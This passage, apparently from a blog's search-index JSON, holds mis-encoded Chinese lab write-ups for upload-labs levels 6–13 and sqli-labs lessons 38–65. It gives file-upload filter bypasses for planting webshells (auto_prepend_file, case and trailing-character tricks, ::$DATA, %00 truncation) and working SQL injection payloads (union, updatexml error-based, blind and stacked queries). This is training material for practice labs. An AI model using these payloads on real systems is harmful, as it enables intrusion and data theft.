auto_prepend_file=webshell.pngï¼ˆæ„æ€æ˜¯è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰phpæ–‡ä»¶éƒ½åŒ…å«webshell.pngï¼‰ï¼Œç„¶åæˆ‘ä»¬å†ä¸Šä¼ webshell.pngï¼Œæœ€åç”¨èšå‰‘è¿æ¥æ—¶æˆ‘ä»¬è¦æ³¨æ„è¿æ¥çš„æ˜¯readme.phpï¼ˆå› ä¸ºå…¶æ–‡ä»¶å†…å®¹åŒ…å«shellï¼‰è€Œä¸æ˜¯webshell.pngã€‚ ä½†æ˜¯è¿™é‡Œæˆ‘å…¶å®æœ‰ä¸ªç–‘é—®ï¼šé‚£å°±æ˜¯æˆ‘ä»¬åœ¨ç°å®æ¸—é€çš„æ—¶å€™åˆæ€ä¹ˆä¼šçŸ¥é“é¶æœºçš„ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨.phpç±»å‹æ–‡ä»¶ï¼Œä»¥åŠ.phpæ–‡ä»¶çš„æ–‡ä»¶åå‘¢ï¼ŸæŒ–ä¸ªå‘ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ pass-06ï¼šåç¼€å¤§å°å†™ç»•è¿‡ è¿™å…³æˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°ï¼Œå®ƒçš„é»‘åå•å·²ç»ç›¸å½“é½å…¨äº†ï¼Œä½†æ˜¯å®ƒç›¸å¯¹å‰å‡ å…³åˆ äº†ä¸€ä¸ªå‡½æ•°ï¼šstrtolower()ã€‚å…¶ä½œç”¨å°±æ˜¯æŠŠæ‰€æœ‰å­—ç¬¦å…¨éƒ¨è½¬ä¸ºå°å†™å­—æ¯ã€‚ é‚£ä¹ˆè¿™å…³åˆ©ç”¨è¿™ä¸€æ¼æ´ï¼Œä¸Šä¼ webshell.phPæ–‡ä»¶ï¼Œç„¶åèšå‰‘è¿æ¥å³å¯ã€‚ pass-07ï¼šç©ºæ ¼ç»•è¿‡ æŸ¥çœ‹æºç å‘ç°å®ƒåˆ å»äº†trim()å‡½æ•°ã€‚ è¿™è¾¹è¡¥ä¸€ä¸ªçŸ¥è¯†ï¼šåœ¨winç³»ç»Ÿä¸‹å‘¢ï¼Œå¦‚æœæ–‡ä»¶åç¼€æœ€åé¢æ˜¯ç©ºæ ¼ã€ç‚¹ã€ï¼šï¼š$DATAä¼šè‡ªåŠ¨çœå»ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨å®¢æˆ·ç«¯ç›®å½•ä¸‹çš„æ˜¯æ–‡ä»¶åæ˜¯â€å¹²å‡€â€ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿™å…³çš„æ€è·¯æ˜¯ï¼šä¸Šä¼ webshell.phpæ–‡ä»¶ç„¶åæŠ“åŒ…ï¼Œåœ¨åç¼€ååŠ ä¸€ä¸ªç©ºæ ¼ã€‚ é‚£ä¹ˆè¿™å…³çš„æ€è·¯å°±æ˜¯ï¼šå…ˆä¸Šä¼ webshell.phpï¼ŒæŠ“åŒ…ï¼Œåœ¨åç¼€ååŠ ä¸ªç©ºæ ¼ spï¼šæ²¡èƒ½å¤ç° pass-08ï¼šç‚¹ç»•è¿‡ æŸ¥çœ‹æºç å‘ç°å®ƒåˆ å»äº†deldot()å‡½æ•°ã€‚åŸç†åŒpass-07 é‚£ä¹ˆè¿™å…³çš„æ€è·¯å°±æ˜¯ï¼šä¸Šä¼ webshell.phpç„¶åæŠ“åŒ…ï¼Œåœ¨åç¼€ååŠ ä¸ªç‚¹ï¼ˆ.ï¼‰ pass-09ï¼š::$DATAç»•è¿‡ æŸ¥çœ‹æºç å‘ç°å°‘äº†å¯¹::$DATAçš„è¿‡æ»¤ã€‚ DATA(NTFSæ–‡ä»¶ç³»ç»Ÿçš„å­˜å‚¨æ•°æ®æµçš„ä¸€ä¸ªå±æ€§)NTFSæ–‡ä»¶ç³»ç»ŸåŒ…æ‹¬å¯¹å¤‡ç”¨æ•°æ®æµçš„æ”¯æŒ,å¤‡ç”¨æ•°æ®æµå…è®¸æ–‡ä»¶åŒ…å«å¤šä¸ªæ•°æ®æµï¼Œæ¯ä¸ªæ–‡ä»¶è‡³å°‘æœ‰ä¸€ä¸ªæ•°æ®æµã€‚åœ¨Windowsä¸­ï¼Œè¿™ä¸ªé»˜è®¤æ•°æ®æµç§°ä¸ºï¼š$DATA,å½“æˆ‘ä»¬è®¿é—®1.php::$DATA æ—¶ï¼Œå°±æ˜¯è¯·æ±‚ 1.php æœ¬èº«çš„æ•°æ®ï¼Œå¦‚æœa.php è¿˜åŒ…å«äº†å…¶ä»–çš„æ•°æ®æµï¼Œæ¯”å¦‚a.php:lake2.phpï¼Œè¯·æ±‚1.php:lake2.php::$DATAï¼Œåˆ™æ˜¯è¯·æ±‚1.phpä¸­çš„æµæ•°æ®lake2.phpçš„æµæ•°æ®å†…å®¹ã€‚ é‚£ä¹ˆæˆ‘ä»¬è¿™å…³çš„æ€è·¯æ˜¯ï¼šå…ˆwebshell.phpï¼ŒæŠ“åŒ…ï¼Œåç¼€åæ·»åŠ ::DATAï¼Œæœ€åèšå‰‘è¿æ¥ã€‚ pass-10 è¿™å…³æŸ¥çœ‹æºç å‘ç°è¿‡æ»¤çš„éƒ½è¿‡æ»¤äº†ï¼Œä½†æ˜¯å’Œä»¥å¾€æœ‰ä¸€ç‚¹ä¸åŒï¼šä¸Šä¼ ä½ç½®è¡¨è¾¾æ–¹å¼æ”¹å˜ æ—§ï¼š$img_path = UPLOAD_PATH.â€™/â€˜.date(â€œYmdHisâ€).rand(1000,9999).$file_ext; æ–°ï¼š$img_path = UPLOAD_PATH.â€™/â€˜.$file_name; spï¼šæ²¡èƒ½å¤ç° pass-11ï¼šåŒåç¼€åç»•è¿‡æˆ‘ä»¬æŸ¥çœ‹æºç ï¼Œå‘ç°å…³é”®å¥ï¼š$file_name = str_ireplace($deny_ext,â€â€, $file_name);æ„æ€æ˜¯æŸ¥æ‰¾ä¸Šä¼ çš„æ–‡ä»¶åä¸­æ˜¯å¦å­˜åœ¨é»‘åå•ä¸­çš„å€¼ï¼Œå¦‚æœå­˜åœ¨å°±åˆ å»ã€‚ é‚£ä¹ˆè¿™å…³æˆ‘ä»¬çš„æ€è·¯æ˜¯ï¼šä¸Šä¼ webshell.phpï¼ŒæŠ“åŒ…ï¼Œåç¼€æ›´æ”¹ä¸ºpphphp pass-12ï¼š%00æˆªæ–­ï¼ˆgetå‹ï¼‰æŸ¥çœ‹è¿™å…³çš„æºç ï¼Œå‘ç°ä¸Šä¼ ä½ç½®è¡¨è¾¾æ–¹å¼æ”¹å˜äº†â€”â€”$img_path = $_GET[â€˜save_pathâ€™].â€/â€œ.rand(10, 99).date(â€œYmdHisâ€).â€.â€.$file_ext; æˆ‘ä»¬å¯ä»¥å‘ç°save_pasthæ˜¯å¯æ§è·¯å¾„ï¼Œæœ‰ç‚¹åƒsqlæ³¨å…¥é‡Œ?id=ã€‚ å…ˆè¡¥å……çŸ¥è¯†ï¼š 1.phpè¯­æ³•ä¸­ï¼Œå½“ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­å­˜åœ¨ç©ºå­—ç¬¦æ—¶ï¼Œä¼šå¯¼è‡´ç©ºå­—ç¬¦åé¢çš„å­—ç¬¦è¢«ä¸¢å¼ƒï¼ˆè¯¯æŠŠå®ƒå½“æˆç»“æŸç¬¦ï¼‰ï¼Œåé¢çš„æ•°æ®ç›´æ¥å¿½ç•¥ï¼Œè¿™å°±å¯¼è‡´æ¼æ´äº§ç”Ÿã€‚ 2.%00æ˜¯å¯¹asciiç ä¸­çš„0å¯¹åº”çš„å­—ç¬¦ç¼–ç åçš„ç»“æœï¼Œ0x00åˆ™æ˜¯%00è§£ç æˆçš„16è¿›åˆ¶ã€‚å½“urlä¸­çš„å‚æ•°æ˜¯é€šè¿‡GETæ–¹å¼è·å–æ—¶ï¼Œ%00ä¼šè¢«è‡ªåŠ¨è§£ç ã€‚å½“é€šè¿‡POSTæ–¹å¼è·å–æ—¶ï¼Œä¸ä¼šè‡ªåŠ¨è§£ç ï¼Œ%00åªä¼šåŸæ ·è¢«å½“æˆå­—ç¬¦ä¸²æ¥è¾“å‡ºã€‚æ‰€ä»¥é€šè¿‡POSTæ–¹å¼è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å°†å®ƒæ”¹å†™ä¸ºåå…­è¿›åˆ¶0x00ã€‚ é‚£ä¹ˆè¿™å…³æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ï¼šä¸Šä¼ webshell.pngï¼ŒæŠ“åŒ…ï¼Œä»¤save_pasth=../upload/webshell.php%00 spï¼šstrrpos()å‡½æ•° åŠŸèƒ½ï¼šstrrpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚è¿”å›å­—ç¬¦ï¼ˆå­—ç¬¦ä¸²ï¼‰åœ¨ç›®æ ‡å­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSEã€‚å­—ç¬¦ä¸²ä½ç½®ä» 0 å¼€å§‹ï¼Œä¸æ˜¯ä» 1 å¼€å§‹ã€‚ è¯­æ³•ï¼šstrrpos(string,find,start) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚ find å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚ start å¯é€‰ã€‚è§„å®šåœ¨ä½•å¤„å¼€å§‹æœç´¢ã€‚ pass-13ï¼š0x00æˆªæ–­ï¼ˆpostå‹ï¼‰æ³•ä¸€ï¼šåŒpass-12 æ³•äºŒï¼šä¸Šä¼ webshell.pngï¼ŒæŠ“åŒ… åŠ ä¸Šwebshell.phpï¼Œç„¶åç‚¹å¼€Hexï¼Œå°†webshell.phpåé¢çš„20æ”¹ä¸º00ï¼Œå¦‚æœæ‰¾ä¸åˆ°20ï¼Œé‚£ä¹ˆå°±åœ¨rawçš„webshell.phpåé¢åŠ ä¸ªç©ºæ ¼","tags":[{"name":"upload-labs","slug":"upload-labs","permalink":"http://example.com/tags/upload-labs/"}]},{"title":"lesson54-65","date":"2021-02-08T15:57:12.000Z","path":"2021/02/08/lesson54-65/","text":"lesson54ï¼šæˆ‘ä»¬é€šè¿‡æŸ¥çœ‹è“å­—å¯ä»¥å¤§è‡´æ˜ç™½è¿™å…³çš„æ„æ€ï¼šè¾“å…¥payloadçš„æ¬¡æ•°å°ç­‰äºåæ¬¡çš„æƒ…å†µä¸‹è·å¾—æ•°æ®åº“ç§˜é’¥ï¼Œå¦‚æœè¶…è¿‡åæ¬¡é‚£ä¹ˆè¡¨åï¼Œåˆ—åè¿˜æœ‰ç§˜é’¥å°±ä¼šé‡æ–°åˆ·æ–°ã€‚ è¯•æ¢æ³¨å…¥ç±»å‹ï¼š?id=1â€™ï¼Œé¡µé¢é”™è¯¯ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾é”™è¯¯ä¿¡æ¯ ?id=1â€™ and â€˜1â€™=â€™1ï¼Œç™»å…¥æˆåŠŸï¼Œå›æ˜¾ç”¨æˆ·åå’Œå¯†ç  ?id=1â€™ and â€˜1â€™=â€™2ï¼Œé¡µé¢é”™è¯¯ å› æ­¤æˆ‘ä»¬å¯çŸ¥å­˜åœ¨sqlæ³¨å…¥ç‚¹ï¼Œä¸”ä¸ºå•å¼•å·å‹ã€‚ å› ä¸ºæˆ‘ä»¬çŸ¥é“äº†åº“åï¼Œæˆ‘ä»¬å°±æ— éœ€å†çˆ†åº“äº†ã€‚ çˆ†è¡¨ï¼š?id=-1â€™ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=â€™challengesâ€™ â€“+ çˆ†åˆ—ï¼š?id=-1â€™ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=â€™xfih974sor â€˜â€“+ çˆ†å€¼ï¼š?id=-1â€™ union select 1,2,group_concat(secret_2W57) from challenges.xfih974sorâ€“+ ç„¶åæˆ‘ä»¬æŠŠå¾—åˆ°çš„å€¼è¾“å…¥ï¼Œsubmitå³å¯ã€‚ æœ€åæŸ¥çœ‹æºç ï¼Œå‘ç°PHPå¯¹è¾“å…¥çš„keyåšäº†è¿‡æ»¤å¤„ç†ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æƒ³ä»keyä¸€æ è¿›è¡Œæ³¨å…¥è¿˜æ˜¯æ¯”è¾ƒå›°éš¾çš„ã€‚ lesson55ï¼šåŒlesson54ï¼Œä¸è¿‡æ³¨å…¥ç±»å‹æ”¹ä¸ºäº†)ã€‚ lesson56ï¼šåŒlesson54ï¼Œä¸è¿‡æ³¨å…¥ç±»å‹æ”¹ä¸ºäº†&#39;)ã€‚ lesson57:åŒlesson54ï¼Œä¸è¿‡æ³¨å…¥ç±»å‹æ”¹ä¸ºäº†&quot;ã€‚ lesson58:æ‰§è¡Œ sql è¯­å¥åï¼Œå¹¶æ²¡æœ‰è¿”å›æ•°æ®åº“å½“ä¸­çš„æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä¸èƒ½ä½¿ç”¨ union è”åˆæ³¨å…¥ï¼Œ è¿™é‡Œä½¿ç”¨æŠ¥é”™æ³¨å…¥æˆ–è€…å»¶æ—¶æ³¨å…¥ã€‚ lesson59ï¼šåŒlesson58ï¼Œæ³¨å…¥ç±»å‹å˜ä¸ºæ•°å­—å‹ã€‚ lesson60ï¼šåŒlesson58ï¼Œæ³¨å…¥ç±»å‹å˜ä¸º&quot;)ã€‚ lesson61ï¼šåŒlesson58ï¼Œæ³¨å…¥ç±»å‹å˜ä¸º&#39;)) lesson62:sqlè¯­æ³•é”™è¯¯æ—¶ä¸ä¼šå›æ˜¾æŠ¥é”™ï¼Œé‚£ä¹ˆæŠ¥é”™æ³¨å…¥ä¹Ÿæ²¡æ³•ç”¨äº†ï¼Œåªèƒ½å»¶æ—¶æ³¨å…¥ã€‚ lesson63ã€64ã€65ï¼šåŒlesson62ï¼Œä»…æ”¹å˜æ³¨å…¥ç±»å‹ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson46-53","date":"2021-02-07T10:56:07.000Z","path":"2021/02/07/lesson46-53/","text":"backgroundâ€”â€”Order byåçš„æ³¨å…¥ï¼š æŸ¥çœ‹mysqlå®˜æ–¹selectçš„æ–‡æ¡£ï¼š ç”±äºorder by åé¢åªèƒ½æ¥(å­—æ®µåï¼Œè¡¨è¾¾å¼ï¼Œä½ç½®)ç­‰ä¿¡æ¯ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½å‘åŸæ¥ä¸€æ ·ä½¿ç”¨è”åˆæŸ¥è¯¢ã€‚ æŸ¥çœ‹lesson46çš„æºç ï¼š 12345678$id=$_GET[&#x27;sort&#x27;]; if(isset($id)) &#123; //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;SORT:&#x27;.$id.&quot;\\n&quot;); fclose($fp);$sql = &quot;SELECT * FROM users ORDER BY $id&quot;; æˆ‘ä»¬çœ‹åˆ°è¿™å…³æˆ‘ä»¬çš„è¾“å…¥åº”è¯¥æ˜¯?sort=ï¼Œè€Œä¸å†æ˜¯?id=ã€‚æˆ‘ä»¬è¾“å…¥?sort=1ï¼Œå³å¯¹ç¬¬ä¸€åˆ—è¿›è¡Œå‡åºæ’åºï¼Œä¸”å‚æ•°å€¼è¦å°ç­‰äºåˆ—æ•°ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼ˆå¦‚æœ‰ä¸€ä¸ªè¡¨æœ‰ä¸‰åˆ—ï¼Œ?sort=4ï¼Œé¡µé¢å°±ä¼šæŠ¥é”™ï¼‰ã€‚ lesson46ï¼šæˆ‘ä»¬æŸ¥çœ‹æºç å¯çŸ¥è¿™æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨order byåçš„æ³¨å…¥å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹æ¯”è¾“å…¥?sort=1 descå’Œ?sort=1 ascï¼ˆdescé™åºï¼Œascå‡åºï¼‰çš„è¿”å›é¡µé¢æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨order byåçš„æ³¨å…¥â€”â€”è‹¥ä¸¤è€…è¿”å›å€¼ä¸åŒï¼Œåˆ™è¯´æ˜å­˜åœ¨order byåçš„æ³¨å…¥ã€‚ è¿™å…³çš„payloadå¥å¼æœ‰ä¸‰ç§ï¼š ?sort=(select Â·Â·Â·Â·Â·Â·) ?sort=1 and (select Â·Â·Â·Â·Â·Â·) ?sort=rand(Â·Â·Â·Â·Â·Â·) æ³¨ï¼šå¥å¼(1)å’Œ(2)æ²¡æœ‰æœ¬è´¨ä¸Šçš„åŒºåˆ«ã€‚ è§£æ³•ä¸€.æŠ¥é”™æ³¨å…¥ï¼šçˆ†åº“ï¼š?sort=1 and updatexml(1,concat(â€˜~â€™, database()),1) çˆ†è¡¨ï¼š?sort=1 and updatexml(1,concat(â€˜~â€™,(select group_concat(table_name) from information_schema.tables where table_schema=â€™securityâ€™)),1) çˆ†åˆ—ï¼š?sort=1 and updatexml(1,concat(â€˜~â€™,(select group_concat(column_name) from information_schema.columns where table_name=â€™usersâ€™ and table_schema=â€™securityâ€™)),1) çˆ†å€¼ï¼š?sort=1 and updatexml(1,concat(â€˜~â€™,(select * from (select concat_ws(â€˜ â€˜,id,username,password) from users limit 0,1) x)),1) æ³¨ï¼šè¿™è¾¹ä¸çŸ¥é“ä¸ºä»€ä¹ˆ&#39;#&#39;ä¸èƒ½ç”¨äº†ï¼Œæ‰¾äº†åŠå¤©åŸå› ã€‚ è§£æ³•äºŒ.å¸ƒå°”ç›²æ³¨ï¼šSQL åƒ PHPï¼Œä¹Ÿæ˜¯ä¸€ç§å¼±ç±»å‹ï¼Œå®ƒä¼šè®¤ä¸ºtrue=1ï¼Œfalse=0ã€‚ç”¨åœ¨order byåä¼šç›´æ¥å¯¼è‡´æ˜¾ç¤ºä¸åŒï¼š A: B: C: é€šè¿‡å¯¹æ¯”A,Cæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œorder byåæ¥è¿”å›æ•°å­—æˆ–å¸ƒå°”å€¼ï¼ˆå› ä¸ºæ˜¯å¼±ç±»å‹ï¼Œå¸ƒå°”å€¼è¿”å›ä»æ˜¯æ•°å­—ï¼‰çš„è¯­å¥æ˜¯æ²¡æœ‰ä½œç”¨çš„ï¼ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ— æ³•ä½¿ç”¨å¥å¼ä¸€ã€äºŒè¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½ä½¿ç”¨å¥å¼ä¸‰è¿›è¡Œå¸ƒå°”ç›²æ³¨å‘¢ï¼Ÿ æˆ‘ä»¬å…ˆè¾“å…¥ï¼š?sort=rand(true) å†è¾“å…¥ï¼š?sort=rand(false) æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤ç§å¾—åˆ°çš„è¿”å›ä¸åŒï¼Œé‚£ä¹ˆå°±è¯´æ˜æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¥å¼ä¸‰æ¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ã€‚ Q:å…¶å®è¿™è¾¹æœ‰ä¸€ä¸ªç–‘é—®ï¼Œä¸æ˜¯è¯´order byåæ¥çš„æ•°å­—ä¸èµ·ä½œç”¨å—ï¼Œä¸ºä»€ä¹ˆrandå‡½æ•°çš„è¿”å›å€¼ä¹Ÿæ˜¯æ•°å­—ï¼Œä½†æ˜¯å´å¯ä»¥èµ·ä½œç”¨å‘¢ï¼Ÿæˆ‘çªç„¶æœ‰ä¸ªçŒœæƒ³â€”â€”order byåæ¥å­—ç¬¦ã€å­—ç¬¦ä¸²æˆ–å¸ƒå°”å€¼æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ•°æ®åº“è¿”å›å€¼ä¸ä¼šæ ¹æ®å­—ç¬¦ä¸²çš„ä¸åŒè€Œä¸åŒï¼Œå¦‚æœæ˜¯è¿™æ ·å°±å¯ä»¥ç†è§£ä¸ºä»€ä¹ˆäº†,å¯æ˜¯åœ¨æˆ‘ç”¨æ—¶é—´ç›²æ³¨è§£è¿™å…³çš„æ—¶å€™ifå‡½æ•°è¿”å›å€¼æ˜¯1ä½†æ˜¯é¡µé¢è¿”å›å´å’Œ?sort=1çš„ä¸åŒã€‚æˆ‘è’™äº†ï¼Œç®—äº†ï¼ŒæŒ–ä¸ªå‘å§ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ æˆ‘ä»¬çš„å¸ƒå°”ç›²æ³¨æ€è·¯æ˜¯è¿™æ ·çš„ï¼š?sort=randï¼ˆsqlè¯­å¥ï¼‰ï¼Œå¦‚æœsqlè¯­å¥æ­£ç¡®ï¼Œé‚£ä¹ˆé¡µé¢çš„è¿”å›ä¼šå’Œ?sort=rand(true)ä¸€æ ·ï¼ˆåˆ©ç”¨äº†randå‡½æ•°çš„ä¼ªéšæœºæ€§ï¼‰ï¼Œåä¹‹å’Œ?sort=rand(false)ä¸€æ ·ã€‚ spï¼šrand()å‡½æ•°æ˜¯ä¸ªéšæœºå‡½æ•°ï¼Œè¿”å›0~1é—´çš„å°æ•°ã€‚ä½¿ç”¨æ—¶ä¹Ÿå¯ä»¥ç»™å®šå‚æ•°å€¼ï¼ˆéšæœºç§å­ï¼‰ï¼Œç›¸åŒçš„å‚æ•°ç”Ÿæˆçš„ç»“æœä¹Ÿç›¸åŒï¼ˆä¼ªéšæœºæ€§ï¼‰ã€‚ çˆ†åº“ï¼š?sort=rand(left(database(),8)=â€™securityâ€™) æˆ‘ä»¬çœ‹åˆ°é¡µé¢è¿”å›ä¸?sort=rand(true)çš„ä¸€æ ·ï¼Œè¯´æ˜æ•°æ®åº“åå°±æ˜¯securityã€‚ åç»­çš„çˆ†è¡¨ï¼Œçˆ†åˆ—ç­‰ä¹Ÿæ˜¯è¿™æ ·ï¼Œæ„é€ payloadç„¶åæ¯”å¯¹é¡µé¢è¿”å›å¾—ç»“æœã€‚ä¸å¤šèµ˜è¿°ã€‚ è§£æ³•ä¸‰.æ—¶é—´ç›²æ³¨ï¼šæ—¶é—´æ³¨å…¥å¯ä»¥åˆ©ç”¨å¥å¼ä¸€æˆ–è€…å¥å¼äºŒã€‚åœ¨è¿™é‡Œæˆ‘ä»¬å°±ç®€å•çš„æ‹¿çˆ†åº“ä¸¾ä¸ªä¾‹å­ï¼Œå‰©ä¸‹çš„å‚è€ƒæ—¶é—´ç›²æ³¨é‚£ä¸€å…³çš„ç¬”è®°ã€‚ çˆ†åº“ï¼š?sort=if(mid(database(),1,8)=â€™securityâ€™,1,sleep(5)) lesson47ï¼šå’Œlesson46ä¸€æ ·ï¼Œæ³¨æ„æ³¨å…¥ç±»å‹çš„å˜åŒ–åšå‡ºé€‚å½“æ”¹å˜ï¼ˆåŒ…æ‹¬å¥å¼çš„æ”¹å˜è¿˜æœ‰æ·»åŠ æ³¨é‡Šç¬¦ç­‰ï¼‰å³å¯ã€‚ lesson48ï¼šåŒlesson46ï¼Œä½†æ˜¯é¡µé¢ä¸å†å‡ºç°æŠ¥é”™å›æ˜¾ï¼Œæ•…æŠ¥é”™æ³¨å…¥ä¸å¯ç”¨ã€‚ lesson49ï¼šåŒlesson47ï¼Œä½†æ˜¯é¡µé¢ä¸å†å‡ºç°æŠ¥é”™å›æ˜¾ï¼Œæ•…æŠ¥é”™æ³¨å…¥ä¸å¯ç”¨ã€‚ lesson50ã€51ã€52 ã€53ï¼šå°±æ˜¯ä¹‹å‰å­¦çš„å †å æ³¨å…¥åŠ ä¸Šæ–°å­¦çš„order byåçš„æ³¨å…¥ï¼Œæ²¡ä»€ä¹ˆæ–°é¢–çš„ï¼Œæ‰“ç»„åˆæ‹³å°±å¥½äº†ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson38-45","date":"2021-02-06T14:44:20.000Z","path":"2021/02/06/lesson38-45/","text":"backgroundâ€”â€”å †å æ³¨å…¥ï¼šåœ¨ SQL ä¸­ï¼Œ;(åˆ†å·)æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡ sql è¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ª sql è¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚ä½†å¯¹äºä¸åŒæ•°æ®åº“ï¼ˆmysqlï¼Œsqlserverï¼Œoracleç­‰ï¼‰æ¥è¯´ï¼Œé™¤oracleä¸å…è®¸å¤–ï¼Œå…¶ä»–æ•°æ®åº“æˆ‘ä»¬å¯ä»¥åœ¨ä¸€æ¡sqlè¯­å¥åç´§æ¥ç€æ„é€ ä¸‹ä¸€æ¡sqlè¯­å¥ã€‚ è¿™é‡Œå¯èƒ½ä¼šæœ‰ä¸€ä¸ªé—®é¢˜â€”â€”union injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼Ÿ(1)åŒºåˆ«å°±åœ¨äº union æˆ–è€… union all æ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ ä»»æ„çš„è¯­å¥ã€‚ (2)å †å æ³¨å…¥ä¸ä¼šåƒè”åˆæ³¨å…¥é‚£æ ·å—ç¬¬ä¸€å¥sqlè¯­å¥å½±å“ã€‚æˆ‘ä»¬çŸ¥é“è”åˆæ³¨å…¥è¦æ»¡è¶³ç¬¬ä¸€å¥sqlè¯­å¥é”™è¯¯çš„æ¡ä»¶ä¸‹æ‰ä¼šæ‰§è¡Œåé¢æˆ‘ä»¬æ„é€ çš„sqlè¯­å¥ï¼Œè€Œå †å æ³¨å…¥æ²¡æœ‰è¿™ä¸ªé—®é¢˜ã€‚ (3)åœ¨æˆ‘ä»¬çš„ web ç³»ç»Ÿä¸­ï¼Œå› ä¸ºä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬ äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœæ—¶åªèƒ½è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ã€‚å› æ­¤ï¼Œåœ¨è¯»å–æ•°æ®æ—¶ï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨ unionï¼ˆè”åˆï¼‰æ³¨å…¥ã€‚ä¾‹ä»¥lesson38çš„ä¸€ä¸ªpayloadä¸ºä¾‹ï¼š?id=0â€™ union select 1,2,database();create table test like usersâ€“+è¿™æ ·æˆ‘ä»¬å¯ä»¥å‰å°è·å–æ•°æ®ä¿¡æ¯ï¼Œåå°ç¯¡æ”¹æ•°æ®ä¿¡æ¯ï¼Œå®ç°â€œåŒç®¡é½ä¸‹â€ã€‚ spï¼šå…³äºæ•°æ®åº“çš„ä¸€äº›å¢åˆ æ”¹æŸ¥åœ¨å¦ä¸€ç¯‡åšå®¢å·²ç»ä¸“é—¨ä»‹ç»äº†ï¼Œè¿™é‡Œä¸å¤šèµ˜è¿°ã€‚ lesson38ï¼šè®¤è¯†ä¸€ä¸‹æ–°å‡½æ•°ï¼š mysqli_connect()å‡½æ•°ï¼šåŠŸèƒ½ï¼šæ‰“å¼€ä¸€ä¸ªåˆ° MySQL æœåŠ¡å™¨çš„æ–°çš„è¿æ¥ã€‚è¯­æ³•ï¼šmysqli_connect(host,username,password,dbname,port,socket)ï¼› mysqli_select_db()å‡½æ•°ï¼šä½œç”¨ï¼šç”¨äºæ›´æ”¹è¿æ¥çš„é»˜è®¤æ•°æ®åº“ã€‚è¯­æ³•ï¼šmysqli_select_db(connection,dbname) mysqli_multi_query()å‡½æ•°ï¼šè¯­æ³•ï¼šmysqli_multi_query(connection,query)ï¼› 